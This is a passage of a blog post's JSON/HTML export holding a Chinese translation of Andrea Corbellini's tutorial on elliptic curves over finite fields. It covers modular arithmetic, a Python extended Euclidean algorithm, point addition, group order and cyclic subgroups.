上的两个整数.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/elliptic-curves-mod-p.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\\\equiv x^3 - 7x + 10 \\\\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singular-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n 曲线 $y^2 \\\\equiv x^3 \\\\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 点加\"}],[\"html\",{\"html\":\"<p>\\n显然, 为了让加法在 $\\\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\\n</p>\\n\\n<p>\\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\\\mathbb{F}_p$(有限域)上的直线和$\\\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\\\equiv 0 \\\\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \\\"$(\\\\text{mod}\\\\ p)$\\\" 的标准直线方程).\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  上图为曲线 $y^2 \\\\equiv x^3 - x + 3 \\\\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\\\equiv 4x + 83 \\\\pmod{127}$是如何通过在平面上不断\\\"重复\\\"出现将这些点连接起来的.\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \\n  <ul>\\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\\\bmod{p})$. 例如, $\\\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\\\bmod{29}) = (2, 24)$ </li>\\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\\n  </ul>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数求和\"}],[\"html\",{\"html\":\"<p>\\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\\\text{mod}\\\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\\n    $$\\n    \\\\begin{array}{rcl}\\n  x_R & = & (m^2 - x_P - x_Q) \\\\bmod{p} \\\\\\\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\\\bmod{p} \\\\\\\\\\n  & = & [y_Q + m(x_R - x_Q)] \\\\bmod{p}\\n\\\\end{array}\\n    $$\\n    当 $P \\\\ne Q$, 斜率 m 可以表示为:\\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\\\bmod{p} $$\\n    而当 $P = Q$, 可得: \\n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\\\bmod{p} $$\\n</p>\\n\\n<p>\\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\\\mathbb{F}_2$ 和 $\\\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a href=\\\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\\\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\\n</p>\\n\\n<p>\\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \\\"切线\\\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\\n</p>\\n\\n<p>\\n   不过, 你可以试试这个计算点加的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\\\">交互式小工具</a>.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线群的阶\"}],[\"html\",{\"html\":\"<p>\\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\\n</p>\\n\\n<p>\\n    首先, 我们说群里点的数量叫做这个群的阶.\\n</p>\\n\\n<p>\\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\\\"困难\\\".\\n</p>\\n\\n<p>\\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\\\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\\\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法和循环子群\"}],[\"html\",{\"html\":\"<p>\\n    在实数域中, 乘法可以通过如下方式定义: \\n    $$\\n    n P = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n    然后, 我们可以通过<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\\\">倍加法</a>通过 $O(\\\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\\\">交互式工具</a>.\\n</p>\\n\\n<p>\\n   离散域 $\\\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\\\equiv x^3 + 2x + 3 \\\\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/cyclic-subgroup.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\\n</p>\"}],[\"markdown\",{\"markdown\":\"* 0P = 0\\n* 1P = (3, 6)\\n* 2P = (80, 10)\\n* 3P = (80, 87)\\n* 4P = (3, 91)\\n* 5P = 0\\n* 6P = (3, 6)\\n* 7P = (80, 10)\\n* 8P = (80, 87)\\n* 9P = (3, 91)\\n* ...\\n\\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成: \\n\\n* 5kP = 0\\n* (5k+1)P = P\\n* (5k+2)P = 2P\\n* (5k+3)P = 3P\\n* (5k+4)P = 4P\"}],[\"html\",{\"html\":\"<p>\\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\\\bmod{5})P$\\n</p>\\n\\n<p>\\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\\n</p>\\n\\n<p>\\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \\n    $$\\n    nP + mP = \\\\underbrace{P + \\\\cdots + P}_{n\\\\ \\\\text{times}} + \\\\underbrace{P + \\\\cdots + P}_{m\\\\ \\\\text{times}} = (n + m)P\\n    $$\\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\\\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\\\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\\n</p>\\n\\n<p>\\n  \\\"子群\\\"是指另一个群的子集构成的群. 而\\\"循环子群\\\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或<strong>基点</strong>.\\n</p>\\n\\n<p>\\n    循环子群是 ECC 以及其他密码学系统的基础, 在下一篇文章中我们将看到其中的原因.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 子群的阶\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[1,\"p\",[]]]}","html":"<!--kg-card-begin: html--><script type=\"text/javascript\" async\n  src=\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\">\n</script>\n\n<script type=\"text/x-mathjax-config\">\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\n</script><!--kg-card-end: html--><!--kg-card-begin: markdown--><blockquote>\n<p>本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 <a href=\"https://creativecommons.org/licenses/by/4.0/deed.zh\">CC-BY 4.0 协议</a> 进行授权<br>\n原文链接 : <a href=\"https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\">https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/</a><br>\n原作者: <a href=\"https://andrea.corbellini.name/\">ANDREA CORBELLINI</a><br>\n译者: <a href=\"http://blog.chxj.name/\">chxj1992</a></p>\n</blockquote>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>这篇文章是<a href=\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/\">椭圆曲线密码学:入门</a>系列文章的第二篇.</p>\n<p>在<a href=\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/\">前一篇文章</a>中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了<a href=\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law\">点加</a>的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的<a href=\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition\">几何方法</a>与<a href=\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition\">代数方法</a>.</p>\n<p>我们还介绍了<a href=\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\">标量乘法</a>($nP = P + P + \\cdots + P$) 并且我们找到了一种用于计算标量乘法的&quot;简单&quot;算法: <a href=\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add\">倍加法</a>.</p>\n<p><strong>现在我们将要把椭圆曲线限制在有限域</strong>而非所有实数的集合上, 让我们来看看这会产生怎样的变化.</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id=\"p\">以p为模的整数域</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\mathbb{Z}/p$, $GF(p)$ 或者 $\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\n</p>\n\n<p>\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\cdot (y + z) = x \\cdot y + x \\cdot z$\n</p>\n\n<p>\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\"时钟运算\"). 这里有一些在 $\\mathbb{F}_{23}$ 上运算的例子:\n    \n  <ul>\n    <li> 加法: $(18 + 9) \\bmod{23} = 4$ </li>\n    <li> 减法: $(7 - 14) \\bmod{23} = 16$ </li>\n    <li> 乘法: $4 \\cdot 7 \\bmod{23} = 5$ </li>\n    <li> \n        加法逆运算: $-5 \\bmod{23} = 18$ <br>\n        推导: $(5 + (-5)) \\bmod{23} = (5 + 18) \\bmod{23} = 0$\n    </li>\n    <li> \n        乘法逆运算: $9^{-1} \\bmod{23} = 18$ <br>\n        推导: $9 \\cdot 9^{-1} \\bmod{23} = 9 \\cdot 18 \\bmod{23} = 1$\n<pre style=\"font-size: 0.75em;color: #66645c;\">\n译者注:\n  根据费马小定理可知, $9^{22} \\bmod{23} = 1$,\n  所以 $9^{-1} \\bmod{23} = 9^{-1+22} \\bmod{23} = 18$\n  这样理解起来要更容易一些\n</pre>\n    </li>\n  </ul>\n</p>\n    \n<p>\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\n</p>\n    \n<p>\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\cdot x \\bmod{4} = 1$ 没有解)\n</p><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"p\">以p为模的除法运算</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n  我们将会定义 $\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\n</p>\n\n<p>\n  借助<a href=\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\">扩展欧几里得算法</a>计算乘法逆元是比较\"容易\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\log p)$ (或者按位长来算, $O(k)$).\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\n</p>\n\n<pre style=\"font-size: 0.75em;color: #66645c;\">\n译者注: \n  扩展欧几里得算法 也叫 扩展的辗转相除法, \n  该算法在译者的之前的博客 <a href=\"http://blog.chxj.name/understanding-rsa-algorithm/\">读跨越千年的RSA算法</a> 一文中曾有讲到, \n  有兴趣的读者可以前往阅读\n</pre><!--kg-card-end: html--><!--kg-card-begin: markdown--><pre><code class=\"language-python\">def extended_euclidean_algorithm(a, b):\n    &quot;&quot;&quot;\n    Returns a three-tuple (gcd, x, y) such that\n    a * x + b * y == gcd, where gcd is the greatest\n    common divisor of a and b.\n\n    This function implements the extended Euclidean\n    algorithm and runs in O(log b) in the worst case.\n    &quot;&quot;&quot;\n    s, old_s = 0, 1\n    t, old_t = 1, 0\n    r, old_r = b, a\n\n    while r != 0:\n        quotient = old_r // r\n        old_r, r = r, old_r - quotient * r\n        old_s, s = s, old_s - quotient * s\n        old_t, t = t, old_t - quotient * t\n\n    return old_r, old_s, old_t\n\n\ndef inverse_of(n, p):\n    &quot;&quot;&quot;\n    Returns the multiplicative inverse of\n    n modulo p.\n\n    This function returns an integer m such that\n    (n * m) % p == 1.\n    &quot;&quot;&quot;\n    gcd, x, y = extended_euclidean_algorithm(n, p)\n    assert (n * x + p * y) % p == gcd\n\n    if gcd != 1:\n        # Either n is 0, or p is not a prime number.\n        raise ValueError(\n            '{} has no multiplicative inverse '\n            'modulo {}'.format(n, p))\n    else:\n        return x % p\n</code></pre>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><h1> $\\mathbb{F}_p$ 上的椭圆曲线 </h1><!--kg-card-end: html--><!--kg-card-begin: html--><p>\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\">一篇文章</a>可以表示成: \n    $$\n    \\begin{array}{rcl}\n  \\left\\{(x, y) \\in \\mathbb{R}^2 \\right. & \\left. | \\right. & \\left. y^2 = x^3 + ax + b, \\right. \\\\\n  & & \\left. 4a^3 + 27b^2 \\ne 0\\right\\}\\ \\cup\\ \\left\\{0\\right\\}\n\\end{array}\n    $$\n    现在则应该写成:\n    $$\n    \\begin{array}{rcl}\n  \\left\\{(x, y) \\in (\\mathbb{F}_p)^2 \\right. & \\left. | \\right. & \\left. y^2 \\equiv x^3 + ax + b \\pmod{p}, \\right. \\\\\n  & & \\left. 4a^3 + 27b^2 \\not\\equiv 0 \\pmod{p}\\right\\}\\ \\cup\\ \\left\\{0\\right\\}\n\\end{array}\n    $$\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\mathbb{F}_p$ 上的两个整数.\n</p><!--kg-card-end: html--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/12/elliptic-curves-mod-p.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><p style=\"font-size: 0.75em;color: #66645c;\">\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\equiv x^3 - 7x + 10 \\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\n</p><!--kg-card-end: html--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/12/singular-mod-p.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><p style=\"font-size: 0.75em;color: #66645c;\">\n 曲线 $y^2 \\equiv x^3 \\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\n</p><!--kg-card-end: html--><!--kg-card-begin: html--><p>\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\n</p><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">点加</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n显然, 为了让加法在 $\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\n</p>\n\n<p>\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\mathbb{F}_p$(有限域)上的直线和$\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\equiv 0 \\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \"$(\\text{mod}\\ p)$\" 的标准直线方程).\n</p><!--kg-card-end: html--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/12/point-addition-mod-p.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><p style=\"font-size: 0.75em;color: #66645c;\">\n  上图为曲线 $y^2 \\equiv x^3 - x + 3 \\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\equiv 4x + 83 \\pmod{127}$是如何通过在平面上不断\"重复\"出现将这些点连接起来的.\n</p><!--kg-card-end: html--><!--kg-card-begin: html--><p>\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \n  <ul>\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\bmod{p})$. 例如, $\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\bmod{29}) = (2, 24)$ </li>\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\n  </ul>\n</p><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">代数求和</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\text{mod}\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\n    $$\n    \\begin{array}{rcl}\n  x_R & = & (m^2 - x_P - x_Q) \\bmod{p} \\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\bmod{p} \\\\\n  & = & [y_Q + m(x_R - x_Q)] \\bmod{p}\n\\end{array}\n    $$\n    当 $P \\ne Q$, 斜率 m 可以表示为:\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\bmod{p} $$\n    而当 $P = Q$, 可得: \n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\bmod{p} $$\n</p>\n\n<p>\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\mathbb{F}_2$ 和 $\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a href=\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\n</p>\n\n<p>\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \"切线\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\n</p>\n\n<p>\n   不过, 你可以试试这个计算点加的<a href=\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\">交互式小工具</a>.\n</p><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">椭圆曲线群的阶</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\n</p>\n\n<p>\n    首先, 我们说群里点的数量叫做这个群的阶.\n</p>\n\n<p>\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\"困难\".\n</p>\n\n<p>\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\n</p><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">标量乘法和循环子群</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n    在实数域中, 乘法可以通过如下方式定义: \n    $$\n    n P = \\underbrace{P + P + \\cdots + P}_{n\\ \\text{times}}\n    $$\n    然后, 我们可以通过<a href=\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\">倍加法</a>通过 $O(\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的<a href=\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\">交互式工具</a>.\n</p>\n\n<p>\n   离散域 $\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\equiv x^3 + 2x + 3 \\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\n</p><!--kg-card-end: html--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/12/cyclic-subgroup.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: html--><p style=\"font-size: 0.75em;color: #66645c;\">\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\n</p><!--kg-card-end: html--><!--kg-card-begin: markdown--><ul>\n<li>0P = 0</li>\n<li>1P = (3, 6)</li>\n<li>2P = (80, 10)</li>\n<li>3P = (80, 87)</li>\n<li>4P = (3, 91)</li>\n<li>5P = 0</li>\n<li>6P = (3, 6)</li>\n<li>7P = (80, 10)</li>\n<li>8P = (80, 87)</li>\n<li>9P = (3, 91)</li>\n<li>...</li>\n</ul>\n<p>我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成:</p>\n<ul>\n<li>5kP = 0</li>\n<li>(5k+1)P = P</li>\n<li>(5k+2)P = 2P</li>\n<li>(5k+3)P = 3P</li>\n<li>(5k+4)P = 4P</li>\n</ul>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\bmod{5})P$\n</p>\n\n<p>\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\n</p>\n\n<p>\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \n    $$\n    nP + mP = \\underbrace{P + \\cdots + P}_{n\\ \\text{times}} + \\underbrace{P + \\cdots + P}_{m\\ \\text{times}} = (n + m)P\n    $$\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\n</p>\n\n<p>\n  \"子群\"是指另一个群的子集构成的群. 而\"循环子群\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或<strong>基点</strong>.\n</p>\n\n<p>\n    循环子群是 ECC 以及其他密码学系统的基础, 在下一篇文章中我们将看到其中的原因.\n</p><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">子群的阶</h1>\n<!--kg-card-end: markdown-->","comment_id":"5e0067842ee0ee000181987b","plaintext":"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 CC-BY 4.0 协议\n[https://creativecommons.org/licenses/by/4.0/deed.zh]  进行授权\n原文链接 : \nhttps://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\n原作者: ANDREA CORBELLINI [https://andrea.corbellini.name/]\n译者: chxj1992 [http://blog.chxj.name/]\n\n\n这篇文章是椭圆曲线密码学:入门\n[http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/]\n系列文章的第二篇.\n\n在前一篇文章\n[http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/]中,\n我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了点加\n[http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law]\n的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的几何方法\n[http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition]\n与代数方法\n[http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition]\n.\n\n我们还介绍了标量乘法\n[http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication]\n($nP = P + P + \\cdots + P$) 并且我们找到了一种用于计算标量乘法的\"简单\"算法: 倍加法\n[http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add]\n.\n\n现在我们将要把椭圆曲线限制在有限域而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\n\n以p为模的整数域\n\n有限域, 首先, 是指一个包含有限个元素的集合. 